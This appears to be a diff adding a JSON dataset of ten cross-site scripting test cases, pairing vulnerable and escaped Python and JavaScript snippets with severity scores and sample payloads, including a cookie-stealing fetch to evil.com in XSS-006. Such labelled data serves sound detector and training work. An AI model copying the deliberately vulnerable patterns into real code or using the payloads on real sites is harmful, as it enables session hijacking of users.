@@ -1,0 +1,102 @@
+[
+  {
+    "id": "XSS-001",
+    "vulnerability_type": "CWE-79",
+    "language": "python",
+    "has_vulnerability": true,
+    "code": "def display_comment(user_input):\n    return f\"<div class='comment'>{user_input}</div>\"",
+    "description": "Direct HTML injection without escaping",
+    "severity": 7,
+    "exploit": "user_input = \"<script>alert('XSS')</script>\""
+  },
+  {
+    "id": "XSS-002",
+    "vulnerability_type": "CWE-79",
+    "language": "python",
+    "has_vulnerability": false,
+    "code": "from html import escape\n\ndef display_comment(user_input):\n    return f\"<div class='comment'>{escape(user_input)}</div>\"",
+    "description": "HTML escaping before rendering",
+    "severity": 0,
+    "exploit": null
+  },
+  {
+    "id": "XSS-003",
+    "vulnerability_type": "CWE-79",
+    "language": "javascript",
+    "has_vulnerability": true,
+    "code": "function displayMessage(message) {\n  document.getElementById('output').innerHTML = message;\n}",
+    "description": "Direct innerHTML assignment",
+    "severity": 8,
+    "exploit": "message = \"<img src=x onerror='alert(1)'>\""
+  },
+  {
+    "id": "XSS-004",
+    "vulnerability_type": "CWE-79",
+    "language": "javascript",
+    "has_vulnerability": false,
+    "code": "function displayMessage(message) {\n  document.getElementById('output').textContent = message;\n}",
+    "description": "Using textContent instead of innerHTML",
+    "severity": 0,
+    "exploit": null
+  },
+  {
+    "id": "XSS-005",
+    "vulnerability_type": "CWE-79",
+    "language": "python",
+    "has_vulnerability": true,
+    "code": "def render_profile(username):\n    html = \"<h1>Welcome \" + username + \"</h1>\"\n    return html",
+    "description": "String concatenation for HTML rendering",
+    "severity": 7,
+    "exploit": "username = \"<script>document.cookie</script>\""
+  },
+  {
+    "id": "XSS-006",
+    "vulnerability_type": "CWE-79",
+    "language": "javascript",
+    "has_vulnerability": true,
+    "code": "const SearchResults = ({ query }) => {\n  return <div dangerouslySetInnerHTML={{__html: query}} />;\n};",
+    "description": "React dangerouslySetInnerHTML with user input",
+    "severity": 9,
+    "exploit": "query = \"<img src=x onerror='fetch(\\'http://evil.com?c=\\'+document.cookie)'>\""
+  },
+  {
+    "id": "XSS-007",
+    "vulnerability_type": "CWE-79",
+    "language": "javascript",
+    "has_vulnerability": false,
+    "code": "const SearchResults = ({ query }) => {\n  return <div>{query}</div>;\n};",
+    "description": "React automatic escaping",
+    "severity": 0,
+    "exploit": null
+  },
+  {
+    "id": "XSS-008",
+    "vulnerability_type": "CWE-79",
+    "language": "python",
+    "has_vulnerability": true,
+    "code": "from flask import Flask, request\n\n@app.route('/search')\ndef search():\n    term = request.args.get('q', '')\n    return f\"<h2>Results for: {term}</h2>\"",
+    "description": "Flask without Jinja2 auto-escaping",
+    "severity": 8,
+    "exploit": "?q=<script>alert(document.domain)</script>"
+  },
+  {
+    "id": "XSS-009",
+    "vulnerability_type": "CWE-79",
+    "language": "python",
+    "has_vulnerability": false,
+    "code": "from flask import Flask, request, render_template_string\n\n@app.route('/search')\ndef search():\n    term = request.args.get('q', '')\n    return render_template_string(\"<h2>Results for: {{ term }}</h2>\", term=term)",
+    "description": "Jinja2 automatic escaping",
+    "severity": 0,
+    "exploit": null
+  },
+  {
+    "id": "XSS-010",
+    "vulnerability_type": "CWE-79",
+    "language": "javascript",
+    "has_vulnerability": true,
+    "code": "function updateURL(userInput) {\n  window.location = 'javascript:' + userInput;\n}",
+    "description": "JavaScript protocol in URL",
+    "severity": 10,
+    "exploit": "userInput = \"alert(document.cookie)\""
+  }
+]
